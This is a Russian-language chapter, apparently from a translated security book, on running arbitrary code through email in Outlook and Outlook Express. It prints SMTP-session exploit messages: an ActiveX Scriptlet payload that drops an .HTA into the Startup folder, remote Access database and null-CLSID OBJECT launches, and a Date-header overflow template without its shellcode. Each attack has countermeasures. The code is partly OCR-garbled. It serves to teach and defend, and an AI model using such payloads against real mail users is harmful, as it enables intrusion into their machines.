<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html;charset=windows-1251">
</head>
<link rel="stylesheet" href="../STYLE.css">
<body TEXT="#000000" BGCOLOR="#E7E3E7" LINK="#004080" VLINK="#004080" olink="#008080" Background="">
<table BORDER=0   COLS=3 WIDTH="16%" >
  <tr> 
    <td><a href="Index8.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
    <td ALIGN=RIGHT><a href="Index10.html"><img SRC="For.gif" BORDER=0 ></a></td>
  </tr>
</table>

 
<br>
<table width="100%" border="0">
  <tr>
    <td class="Text_n">
 
<p class="Tit_CN">

Запуск произвольного кода с помощью электронной почты</P>

<p class="Text_n">
При описании следующих атак будут продемонстрированы различные механизмы запуска команд на целевом компьютере. Многие из них приводятся в действие при открытии коварных сообщений или их предварительном просмотре в соответствующей части окна программ Outlook и Outlook Express.
<br>
<P align="center">
<span class="Text_b">
Атаки с использованием элементов ActiveX, помеченных как &quot;safe for scripting&quot;</span></P>
<br>
<p class="Text_n">
Взломщики не могли выдумать ничего более убийственного: все, что нужно сделать жертве, — это просто прочитать сообщение (или просмотреть его в окне предварительного просмотра программ Outlook и Outlook Express, если такая возможность имеется). При этом со стороны пользователя не требуется никакого вмешательства. Эта чудовищная &quot;простота&quot; снова появилась благодаря элементу управления Scriptlet. typelib, помеченному как &quot;safe for scripting&quot; (более подробно этот вопрос обсуждается в разделе,
посвященном элементам ActiveX). С такой же легкостью можно использовать Eyegod.ocx, но метод, рассматриваемый в данном разделе, основан на применении проверочного кода Георгия Гунински, в котором используется элемент управления Scriptlet. typelib. Напомним, что Георгий поместил этот код на своем Web-узле. Ниже приведена слегка модифицированная версия этого кода, вставленного в капсулу для взлома почты.
<br>
<p class="Code">
helo somedomain.com<br>
mail from: &lt;mallory@malweary.com&gt;<br>
rcpt to: &lt;hapless@victim.net&gt;<br>
data<br>
subject: Ya gotta read this!<br>
MIME-Version: 1.0<br>
Content-Type: text/html; charset=us-ascii<br>
Content-Transfer-Encoding: 7bit<br>
If you have received this message in error, please delete it.<br>
&lt;object id=&quot;scr&quot; <br>
classid=&quot;clsid:06290BD5-48AA-llD2-8432-006008C3FBFC&quot;&gt;<br>
&lt;/object&gt;<br>
&lt;SCRIPT&gt;<br>
scr.Reset();<br>
scr.Path=&quot;C:\\WIN98\\start<br>
menu\\programs\\startup\\guninski.hta&quot;;<br>
scr.Doc=&quot;&lt;object id='wsh'<br>
classid='clsid:F935DC22-1CFO-11DO-ADB9-<br>
OOC04FD58AOB'x/object&gt;&lt;SCRIPT&gt;alert<br>
{<br>
' Written by Georgi Guninski<br>
);&lt;/&quot; + &quot;SCRIP<br>
T&gt;&quot;;<br>
scr.write ();<br>
&lt;/SCRIPT&gt;<br>
&lt;/object&gt;<br>
quit<br>
</p>

Этот код проводит атаку в два этапа. Во-первых, он создает в папке Startup на компьютере пользователя файл приложения HTML (с расширением .НТА) и записывает в него содержимое сценария. Этот файл создается почти незаметно для пользователя, пока он просматривает сообщение (если внимательно следить за световым индикатором жесткого диска, то можно заметить его мерцание). Вот как выглядит наше тестовое сообщение в папке inbox (ниже на рисунке показано окно программы Outlook Express). Для завершения взлома достаточно отобразить сообщение в окне предварительного просмотра.


<p class="label"><IMG src="9.gif" ><br></p>

 <p class="Text_n">
Следующий этап произойдет, когда пользователь перезагрузит компьютер. Рано или поздно это неизбежно случится. Конечно же, можно написать такой сценарий, который сам выполнял бы перезагрузку. При этом запустится файл .НТА (данные файлы автоматически интерпретируются командной оболочкой Windows). В нашем случае пользователь получит следующее &quot;приветственное&quot; сообщение.


<p class="label"><IMG src="10.gif"  ><br></p>

 <p class="Text_n">

Эти безобидные действия — одна из многих реализаций в безбрежном море возможностей. В подобной ситуации жертва полностью находится в руках взломщика.
<br>

Действие так называемого червя КАК основано на уязвимости Scriptlet, который тоже можно использовать для охоты на доверчивых (и не пользующихся модулями обновления) пользователей Outlook и ОЕ. Более подробную информацию о &quot;черве&quot; КАК можно найти по адресу
<span class="Text_b"> http://www.syiri.antec.com/avcenter/venc/data/wscript. kakworm.html</span>.
<br>
<P align="center">
<span class="Text_b">
Контрмеры</span></P>
<br>
<p class="Text_n">
Примените модули обновления для компонентов ActiveX Scriptlet и Eyedog, которые можно получить по адресу
<span class="Text_b">http://www.microsoft.com/technet/security/ bulletin/ms99-032.asp</span>.
<br>

Еще раз следует напомнить, что данные модули обновления позволят устранить проблему, связанную только с данными компонентами. Более универсальной мерой является отключение в программах электронной почты возможности применения элементов управления ActiveX. Используемая для этого процедура описана в разделе, в котором рассматриваются зоны безопасности.
<br>
<P align="center">
<span class="Text_b">
&quot;Запуск&quot; документов MS Office с помощью элементов ActiveX</span></P>
<br>
<p class="Text_n">
Георгий Гунински не ограничил свои изыскания использованием дескрипторов HTML в электронном сообщении для загрузки потенциально опасных элементов управления ActiveX. В последующих информационных сообщениях, опубликованных на его узле, сообщается, что с помощью этого же метода могут быть &quot;запущены&quot; и потенци-ачьно опасные документы Microsoft Office (&quot;поведение&quot; этих документов очень похоже на поведение элементов управления ActiveX). С результатами исследований можно ознакомиться по адресу
<span class="Text_b"> http://www.nat.bg/-joro/sheetex-desc.html </span> (для документов Excel и PowerPoint) и
<span class="Text_b"> http://www.nat.bg/~joro/access-desc.html</span> (здесь описывается процедура запуска кода VBA, содержащегося в базах данных Access).
<br>

Руководствуясь двумя соображениями, в этом разделе будет рассмотрена вторая из этих возможностей. Во-первых, вопросы, связанные с Excel и PowerPoint, более интересны ввиду способности этих приложений незаметно записывать файлы на диск, что будет обсуждаться в последующих разделах. Во-вторых, изъян, основанный на использовании Access, по мнению большинства специалистов в области обеспечения безопасности, является более серьезным, поскольку справиться с ним не помогают все те меры предосторожности, которые применяются для защиты от элементов управления ActiveX. Даже если полностью запретить их использование, система все равно остается уязвимой. Вот как высоко оценили серьезность этой проблемы специалисты института SANS: &quot;Возможно, это одна из самых опасных ошибок, допущенных компанией Microsoft в программах для рабочих станций Windows (всего ряда — 95. 98, 2000, NT 4.0)&quot;. Грустно, что это замечание, которое на первый взгляд наполнено сенсуализмом, на самом деле может оказаться не так далеко от истины.
<br>

Проблема заключается в том способе, который в системе Windows используется для проверки файлов Access (.MDB) при их загрузке в Internet Explorer с помощью дескриптора OBJECT, как показано в следующем фрагменте кода HTML, предоставленного Георгием Гунински.&nbsp;
<br>
<p class="Code">
 OBJECT data=&quot;db3.mdb&quot; id=&quot;dl&quot;&gt;&lt;/OBJECT&gt;
</p>

Как только программа Internet Explorer встречает дескриптор объекта, загружается база данных Access, имя которой задано в параметре data=, а затем для ее открытия вызывается программа Access. Это происходит перед тем, как пользователь получит предупреждение о потенциальной опасности, которая при этом может возникнуть. Таким образом, база данных будет запущена независимо от того, настроен IE/Outlook/ОЕ для запуска элементов управления ActiveX или нет. Ну и дела!
<br>

Пример Георгия основан на применении удаленного файла с именем db3.mdb, который он разместил на своем Web-узле. Этот файл представляет собой базу данных Access. где находится одна форма, запускающая текстовый редактор Wordpad. Вот еще одна капсула для взлома электронной почты, демонстрирующая, как можно реализовать эту атаку.
<br>
<p class="Code">
helo  some domain, corn<br>
mail   from:   &lt;mallory@attack.net&gt;<br>
rcpt  to:   &lt;hapless@victim.net&gt;<br>
data<br>
subject: And another thing!<br>
Importance: high<br>
MIME-Version: 1.0<br>
Content-Type: text/html; charset=us-ascii<br>
&lt;HTML&gt;<br>
&lt;h2&gt;Enticing message here!&lt;/h2&gt;<br>
id=&quot;dl&quot;x/OBJECT&gt;<br>
&lt;/HTML&gt;<br>
quit<br>
</p>

В этом примере явно задан URL файла db3.mdb (строка 12), чтобы можно было использовать его в сообщении электронной почты. Институтом SANS было выдвинуто требование, чтобы при доступе и совместном использовании файлов Access через Internet применялся протокол SMB. Просто поразительно, сколько FTP-серверов предоставляет свои ресурсы для бесконтрольного размещения данных и доступа к ним. В следующих разделах указаны другие места хранения данных, которые могут заинтересовать взломщиков.
<br>

Основной особенностью атак этого типа является то, что обработка этих простых дескрипторов программами IE/Outlook/ОЕ приводит к запуску файлов, в которых содержится мощный макрос VBA. При этом не требуется какого-либо вмешательства пользователя. Неужели такая перспектива еще никого не встревожила?
<br>
<P align="center">
<span class="Text_b">
Контрмеры: задание пароля администратора
Ассеss</span></P>
<br>
<p class="Text_n">
Запрещение использования элементов управления ActiveX не предотвратит возможности реализации описанных атак. Поэтому нужно применить модуль обновления в соответствии с инструкциями, приведенными по адресу
<span class="Text_b">http://www.microsoft.com/-technet/security/bulletin/MS00-049.asp</span>. Особое внимание следует обратить на модуль обновления, предназначенный специально для устранения проблемы, связанной с Access (компания Microsoft назвала ее изъяном &quot;сценария IE&quot; (&quot;IE Script&quot;)).
<br>

Компания Microsoft рекомендует также воспользоваться следующим средством, которое будет полезно независимо от того, был ли установлен модуль обновления. Для программы Access нужно установить пароль администратора (по умолчанию он не используется). Выполните для этого следующие действия.
<br>

1. Запустите Access 2000, но не открывайте никаких баз данных.
<br>

2. Выберите команду Tools&gt;Security.
<br>

3. Выберите пункт User And Group Accounts.
<br>

4. Выберите пользователя Admin, который должен существовать по умолчанию.
<br>

5. Перейдите во вкладку Change Logon Password.
<br>

6. Если до этого не были внесены никакие изменения, пароль администратора  должен быть пустым.
<br>

7. Введите пароль администратора.
<br>

8. Для выхода щелкните на кнопке ОК.
<br>

Это должно предотвратить возможность запуска злонамеренного кода VBA и его работы с высокими привилегиями. Специалисты SANS также отметили, что блокирование брандмауэром исходящих запросов на совместное использование файлов Windows (порты TCP 139 и TCP 445) позволит уменьшить вероятность необдуманного запуска пользователями удаленного кода.
<br>
<P align="center">
<span class="Text_b">
Запуск файлов с помощью ненулевого параметра CLSID элементов ActiveX</span></P>
<br>
<p class="Text_n">
Причиной выявления данного изъяна послужило вскользь сделанное замечание в дискуссии, которая велась в бюллетене Bugtraq по поводу уязвимости,
обусловленной &quot;навязыванием&quot; файла вложения (см. ниже), которую предложили реализовать на узле malware. com. Велд Понд (Weld Pond), высококлассный хакер из группы LOpht, прославившийся благодаря утилите netcat для NT (см. главу 5), завел со своим коллегой Oil Dog из группы &quot;Cult of Dead Cow&quot;, знаменитым автором программы Back Orifice 2000 (см. главы 4 и 14), разговор о механизме запуска файлов, навязанных пользователям по методике malware.com. Оказывается, можно запустить любой файл, поместив в тело электронного сообщения дескриптор OBJECT и сконфигурировав его с помощью ненулевого параметра CLSID. При этом в мишень превращается каждый исполняемый файл, находящийся на диске пользователя. Ниже приведен пример соответствующей капсулы для взлома электронной почты.
<br>
<p class="Code">
helo somedomain.com<br>
mail from: &lt;mallory@attack.net&gt;<br>
rcpt to: &lt;hapless@victim.net&gt;<br>
data<br>
subject: Read this!<br>
Importance: high<br>
MIME-Version: 1.0<br>
Content-Type: text/html; charset=us-ascii<br>
&lt;HTML&gt;<br>
&lt;HEAD&gt;<br>
&lt;/HEAD&gt;<br>
&lt;BODY&gt;<br>
&lt;OBJECT CLASSID='CLSID:<br>
10000000-0000-0000-0000-000000000000'<br>
CODEBASE='с:\windows\calc.exe'X/OBJECT&gt;<br>
&lt;/BODYX/HTML&gt;<br>
quit<br>
</p>

Обратите внимание на ненулевой параметр CLSID. Именно он приводит в действие весь механизм. Файл, который будет запущен, задается параметром CODEBASE.
<br>

Однако в процессе тестирования выяснилось, что для того, чтобы этот способ успешно сработал, требуется удачное расположение планет. Первое необходимое условие заключается в том, что нужно, чтобы в программе Outlook Express 5.00.2615.200 для зоны был установлен уровень безопасности Low. Кроме того, при попытке запуска файла calc.exe из папки System появлялось диалоговое окно с предупреждением о неподписанном элементе управления. Для такого стечения обстоятельств пользователи должны быть достаточно безграмотны. Но если проделать это все же удастся, то появляются заманчивые перспективы, особенно при использовании этого способа совместно с возможностью записи файлов на диск, предложенной на Web-yxie
malware. com.
<br>
<P align="center">
<span class="Text_b">Контрмеры против использования ненулевого параметра CLSID</span></P>
<br>
<p class="Text_n">
Основываясь на результатах тестирования, авторы утверждают, что установка соответствующего уровня безопасности зоны позволит устранить эту проблему (см. в предыдущих разделах описание зон безопасности).
<br>
<P align="center">
<span class="Text_b">
Переполнение буфера поля даты в программах Outlook и Outlook Express</span></P>
<br>
<p class="Text_n">
Возможно, кому-то из читателей показалось, что стержнем большинства типов атак являются элементы управления ActiveX. 18 июля 2000 года в бюллетене Bugtraq&nbsp;
появилось сообщение об изъяне программ Outlook и Outlook Express совсем другого типа, не имеющем ничего общего с элементами ActiveX.
<br>

Проблема заключается в классическом переполнении буфера, причиной которого может послужить заполнение раздела GMT (Greenwich Mean Time — среднее время по Гринвичу) поля даты заголовка электронного сообщения чрезмерно большой порцией данных. В процессе загрузки такого сообщения через протоколы РОРЗ или IMAP4 файл INCETCOMM.DLL, который отвечает за анализ значения GMT, не выполняет необходимой проверки переполнения границ. Это приводит к возникновению аварийной ситуации в программах Outlook и Outlook Express и возможности запуска произвольного кода. Ниже приведен пример кода, работа которого основана на наличии этого изъяна.
<br>
<p class="Code">
Date: Tue, 18 July 2000 14:16:06 +&lt;около 1000 байтхкод для запуска&gt;
</p>

В этой книге уже неоднократно упоминалось, что возможность запуска в системе произвольного кода открывает неограниченные возможности. Коварное сообщение позволяет незаметно установить программу типа &quot;троянский конь&quot;. Через него могут распространяться &quot;черви&quot;, а, кроме того, оно может дискредитировать целевую систему, запускать вложения — одним словом, делать практически все, что заблагорассудится.
<br>

Пользователям Outlook Express достаточно лишь открыть папку с представляющим опасность сообщением, и они сразу же становятся уязвимыми. Простая загрузка такого сообщения в процессе проверки почты может привести к переполнению буфера и возникновению исключительной ситуации. Таким образом, пользователи ОЕ попадают в замкнутый круг: сообщение не может нормально загрузиться, а его содержимое приводит к аварии программы при каждой последующей попытке восстановить почтовую программу. Одним из способов устранения описанной проблемы является просмотр почты и удаление вызвавшего аварию сообщения (при условии, что мы можем его &quot;вычислить&quot;) с помощью почтового клиента, отличного от Outlook/OE. Это легко сделать, используя программу Netscape Messenger, в окне предварительного просмотра которой отображается дата сообщения, по которой можно понять, какое из сообщений привело к сбою. Пользователи Outlook уязвимы во время предварительного просмотра, чтения и пересылки сообщения, вызывающего неполадки, а также тогда, когда они на него отвечают.
<br>

Первоначально код, основанный на данном изъяне, был опубликован в бюллетене Bugtraq. Однако позже выяснилось, что данный подход можно применять лишь против сервера, входящего в состав частной локальной сети. Поэтому он неприменим, если его использовать портив пользователя, подсоединенного к Internet через модем. Как представляется, эта публикация стала результатом ошибки Аарона Дрю (Aaron Drew), который, по-видимому, пытался применить подход, подобный описанному в этой главе методу капсулы для взлома электронной почты, но вместо этого ошибочно отправил свое сообщение в бюллетень Bugtraq. Подготовленное для официального оглашения, это сообщение выглядело бы следующим образом (обратите внимание на строку Date, в которой для краткости опущены данные, вызывающие переполнение; в примере они заключены в квадратные скобки, которые не являются необходимыми).
<br>
<p class="Code">
helo somedomain.com <br>
mail from: &lt;mallory@attack.net&gt;<br>
rcpt to: &lt;hapless@victim.net&gt;<br>
data<br>
Date: Sun, 7 May 2000 11:20:46 <br>
+[~1000 байт + код в шестнадцатеричном формате или ascii]<br>
Subject: Date overflow!<br>
Importance: high MIME-Version: <br>
1.0 'Content-Type: text/plain;<br>
charset=us-ascii<br>
This is a test of the Outlook/OE date field overflow,<br>
quit<br>
</p>

Группа Underground Security Systems Research (USSR,<span class="Text_b"> http://www.ussrback.com</span>) также сообщила о том, что обнаружила эту брешь (по крайней мере, об этом заявил хакер Метатрон (Metatron)). Однако, по их утверждению, они не стали сообщать о ней публично, ожидая, пока Microsoft выпустит соответствующий модуль обновления. На базе этого изъяна группа USSR опубликовала свою реализацию, что вызвало интерес к их Web-узлу. Код запускается почти таким же образом, как и в предыдущем примере.
<br>
<P align="center">
<span class="Text_b">
Контрмеры против переполнения поля даты</span></P>
<br>
<p class="Text_n">
Согласно информационному сообщению компании Microsoft, которое можно найти на ее Web-узле по адресу
<span class="Text_b"> http://www.microsoft.com/technet/<br>security/bulletin/ MS00-043.asp</span>, изъян может быть устранен с помощью модуля
обновления, находящегося по адресу <span class="Text_b">http://www.microsoft.com/windows/<br>ie/download/critical/patch9.htm</span>.
<br>

Кроме того, эту проблему можно решить, установив одно из следующих обновлений с параметрами, принятыми по умолчанию.
<br>
<ul>
  <li>&nbsp;Internet Explorer 5.01 Service Pack 1.</li>
  <li>&nbsp;Internet Explorer 5.5 на любую систему за исключением Windows 2000.</li>
</ul>

Если выполняется установка, отличная от установки по умолчанию, и во время этого процесса устанавливаются обновленные компоненты Outlook Express, то эта уязвимость также устраняется (при этом у пользователя будет возможность соответствующего выбора).
<br>

При установке на компьютер с операционной системой Windows 2000 IE 5.5 не устанавливает обновленные компоненты Outlook Express, поэтому этот изъян не устраняется.
<br>

Следует также заметить, что по утверждению компании Microsoft пользователи Outlook, у которых эта программа настроена только для использования служб MAPI, не подвержены негативному влиянию, независимо от установленной у них версии Internet Explorer. Если службы электронной почты Internet не установлены
(Tools&gt;Services), то библиотека INETCOMM.DLL не используется.
<br>


</p></td>
  </tr>
</table>
<br>
<table BORDER=0  COLS=3 WIDTH="11%" >
  <tr> 
   <td><a href="Index8.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
    <td ALIGN=RIGHT><a href="Index10.html"><img SRC="For.gif" BORDER=0 ></a></td>
   
  </tr>
</table>
</body>
</html>
